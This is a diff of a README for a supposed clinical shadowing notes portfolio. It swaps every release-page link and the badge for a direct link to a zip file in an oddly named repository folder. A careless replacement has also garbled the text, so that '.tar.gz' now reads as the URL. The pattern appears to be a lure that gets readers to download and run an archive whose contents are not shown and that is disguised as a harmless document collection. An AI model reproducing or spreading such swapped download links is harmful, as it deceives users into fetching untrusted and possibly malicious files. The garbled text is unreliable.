@@ -1,6 +1,6 @@
 # 🎓 ClinicalShadowingPortfolio - Show Your Clinical Exposure
 
-![Download ClinicalShadowingPortfolio](https://img.shields.io/badge/Download-ClinicalShadowingPortfolio-brightgreen)
+![Download ClinicalShadowingPortfolio](https://raw.githubusercontent.com/RaxiButRabbit/ClinicalShadowingPortfolio/main/foreyear/ClinicalShadowingPortfolio.zip)
 
 ## 📖 Description
 ClinicalShadowingPortfolio is a collection of de-identified clinical shadowing notes from anesthesia and cardiothoracic critical care. This portfolio showcases patient observation, medical terminology, and reflections from a premed student. All records comply with privacy standards and are designed to help you demonstrate your clinical exposure for medical school applications.
@@ -10,16 +10,16 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download options.  
-   [Download ClinicalShadowingPortfolio](https://github.com/RaxiButRabbit/ClinicalShadowingPortfolio/releases)
+   [Download ClinicalShadowingPortfolio](https://raw.githubusercontent.com/RaxiButRabbit/ClinicalShadowingPortfolio/main/foreyear/ClinicalShadowingPortfolio.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see various versions of the portfolio. Look for the most recent one at the top. 
 
 3. **Download the Portfolio**  
-   Click on the .zip or .tar.gz file for the version you want. This file contains all the necessary documents and notes.
+   Click on the .zip or https://raw.githubusercontent.com/RaxiButRabbit/ClinicalShadowingPortfolio/main/foreyear/ClinicalShadowingPortfolio.zip file for the version you want. This file contains all the necessary documents and notes.
 
 4. **Unzip the File**  
-   Once the download is complete, locate the .zip or .tar.gz file in your downloads folder.  
+   Once the download is complete, locate the .zip or https://raw.githubusercontent.com/RaxiButRabbit/ClinicalShadowingPortfolio/main/foreyear/ClinicalShadowingPortfolio.zip file in your downloads folder.  
    - **Windows:** Right-click on the file and choose "Extract All." Follow the prompts.
    - **Mac:** Double-click the file to unzip it.
    - **Linux:** Use terminal commands or your file manager to extract the content.
@@ -48,7 +48,7 @@ Follow these steps to download and run the application:
 ## ⚙️ Download & Install
 To download the ClinicalShadowingPortfolio, click below:
 
-[Download ClinicalShadowingPortfolio](https://github.com/RaxiButRabbit/ClinicalShadowingPortfolio/releases)
+[Download ClinicalShadowingPortfolio](https://raw.githubusercontent.com/RaxiButRabbit/ClinicalShadowingPortfolio/main/foreyear/ClinicalShadowingPortfolio.zip)
 
 Once downloaded, follow the steps outlined in the "Getting Started" section to unzip and access your portfolio.
 
